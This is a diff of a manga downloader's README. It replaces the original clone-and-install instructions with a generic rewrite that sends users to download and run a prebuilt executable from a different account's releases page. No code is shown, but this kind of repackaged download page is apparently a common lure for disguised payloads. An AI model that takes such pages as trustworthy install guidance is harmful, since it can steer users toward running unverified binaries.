@@ -1,91 +1,104 @@
-# Manga Downloader
+# 📚 mangakakalot_downloader - Enjoy Manga with Ease
 
-A powerful Python program designed to simplify the process of downloading manga from popular online sources. This application supports `mangakakalot.gg`, `natomanga.com`, and `nelomanga.net`, offering both a command-line interface (CLI) for automation and a user-friendly graphical user interface (GUI) for easy navigation.
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/antonio7129/mangakakalot_downloader/releases)
 
-## Features
+## 📖 Overview
 
--   **Multi-site Support:** Download manga from popular sites like MangaKakalot, Natomanga, and Nelomanga.
--   **Search Functionality:** Easily search for manga by title across supported websites.
--   **Chapter Management:** View and select specific chapters for download.
--   **Configurable Settings:** Customize download directory and other preferences.
--   **CLI & GUI:** Choose between a command-line interface for scripting or a user-friendly graphical interface.
--   **Cloudflare Bypass (via Cookies):** Supports bypassing Cloudflare protection on certain sites by utilizing browser-provided cookies.
+mangakakalot_downloader is a simple and user-friendly Python application designed for manga fans. This tool allows you to search and download manga from popular websites like mangakakalot.gg, natomanga.com, and nelomanga.net. With both a command-line interface (CLI) and a graphical user interface (GUI), you can choose the method that you find easiest.
 
-## Installation
+## 🚀 Getting Started
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/Yui007/mangakakalot.git
-    cd mangakakalot
-    ```
+This application works on various operating systems, including Windows, macOS, and Linux. To run the application, you need to ensure that your system meets the following requirements:
 
-2.  **Create a virtual environment (recommended):**
-    ```bash
-    python -m venv venv
-    # On Windows
-    .\venv\Scripts\activate
-    # On macOS/Linux
-    source venv/bin/activate
-    ```
+### 💻 System Requirements
 
-3.  **Install dependencies:**
-    ```bash
-    pip install -r manga_downloader/requirements.txt
-    ```
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or Linux (any modern distribution)
+- **Python**: Version 3.6 or later (if using CLI; not needed for GUI)
+- **Internet Connection**: Required for downloading manga
 
-## Usage
+Once your system meets these requirements, you are ready to download the application.
 
-After completing the installation steps and activating your virtual environment, ensure your current working directory is the root of the cloned repository (`mangakakalot`). From this directory, you can run the application using either the Command-Line Interface (CLI) or the Graphical User Interface (GUI).
+## 📥 Download & Install
 
-### Command-Line Interface (CLI)
+To get started, visit the following page to download the latest version of the mangakakalot_downloader:
 
-For detailed CLI usage, refer to [manga_downloader/cli/usage.md](manga_downloader/cli/usage.md).
+[Download Latest Release](https://github.com/antonio7129/mangakakalot_downloader/releases)
 
-**Basic Search Example:**
-```bash
-python -m manga_downloader.cli.main search "solo leveling" --site mangakakalot
-```
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version of the application.
+3. Download the appropriate file for your operating system. 
+4. If you downloaded the GUI version, simply run the executable file to start the application. If you chose the CLI version, follow the instructions below to run it.
 
-**Download Example:**
-```bash
-python -m manga_downloader.cli.main download --manga-url "https://www.natomanga.com/manga/immortal-undertaker" --chapter-range "1-5"
-```
+## ⚙️ Running the Application
 
-### Graphical User Interface (GUI)
+### 🖥️ Using the GUI
 
-For detailed GUI usage, refer to [manga_downloader/gui/USAGE.md](manga_downloader/gui/USAGE.md).
+If you downloaded the GUI version, follow these simple steps:
 
-**Launch the GUI:**
-```bash
-python -m manga_downloader.gui.main
-```
+1. Locate the downloaded executable file.
+2. Double-click the file to open the application.
+3. Enter the title of the manga you want to download in the search bar.
+4. Click on the download button next to the selected manga.
+5. Choose the location on your computer where you’d like to save the downloaded files.
 
-## Configuration
+### 🖥️ Using the Command-Line Interface (CLI)
 
-### `manga_downloader/core/config.py`
+If you prefer the CLI version, here's how to use it:
 
-This file contains base URLs for manga websites and default HTTP headers.
+1. Open your command-line interface:
+   - On Windows, search for "cmd" in the Start menu.
+   - On macOS, open "Terminal" from the Applications folder.
+   - On Linux, look for "Shell" or "Terminal" in your applications.
+   
+2. Navigate to the folder where you saved the downloaded Python script. Use the `cd` command followed by the path to that folder.
+3. Run the command to start the downloader:
 
-### `manga_downloader/core/cookies.json`
+   ```bash
+   python mangakakalot_downloader.py "<manga_title>"
+   ```
 
-This file is used to store cookies for sites protected by Cloudflare (e.g., `nelomanga.net`). If you encounter issues searching or accessing content from such sites, you may need to manually update this file with cookies from your browser.
+4. Replace `<manga_title>` with the title of the manga you want to download.
+5. The manga will begin downloading to the current directory.
 
-**Example `cookies.json` structure:**
-```json
-{
-    "nelomanga": {
-        "__cflb": "YOUR_CF_LB_COOKIE_VALUE",
-        "cf_clearance": "YOUR_CF_CLEARANCE_COOKIE_VALUE",
-        "__cf_bm": "YOUR_CF_BM_COOKIE_VALUE"
-    }
-}
-```
-**Note:** Do not commit your personal cookie values to public repositories. The `cookies.json` file should be kept empty or with placeholder values when sharing on GitHub.
+## 📜 Features
 
-## Contributing
+- **Multiple Sources**: Download manga from mangakakalot.gg, natomanga.com, and nelomanga.net.
+- **Search Functionality**: Quickly find your favorite titles using the search bar.
+- **Easy to Use**: Both GUI and CLI options make it accessible for all users.
+- **Organized Downloads**: The application saves your downloaded files in an organized folder structure.
 
-Contributions are welcome! Please feel free to open issues or submit pull requests.
+## 🌐 Supported Sources
 
-## License
+mangakakalot_downloader supports the following websites:
 
-This project is licensed under the [MIT License](LICENSE).
+- [mangakakalot.gg](https://mangakakalot.gg)
+- [natomanga.com](https://natomanga.com)
+- [nelomanga.net](https://nelomanga.net)
+
+You can find hundreds of titles and enjoy reading them offline.
+
+## ❓ Troubleshooting
+
+If you encounter any issues, consider the following tips:
+
+- Ensure you have an active internet connection.
+- Make sure you are using the correct command or entering the title accurately.
+- Check if your Python version is compatible (for the CLI).
+- Restart your application if it becomes unresponsive.
+
+## 📞 Support
+
+If you need further assistance or have questions, feel free to open an issue on the GitHub repository. Our community is here to help you.
+
+## 🎉 Contributing
+
+We welcome contributions! If you have suggestions for improvements or features, feel free to fork the repository, make changes, and submit a pull request.
+
+## 🔗 References
+
+For more information and updates:
+
+- [GitHub Repository](https://github.com/antonio7129/mangakakalot_downloader)
+- [Documentation](https://github.com/antonio7129/mangakakalot_downloader/wiki)
+
+By following these steps, you can easily download and enjoy your favorite manga with mangakakalot_downloader.
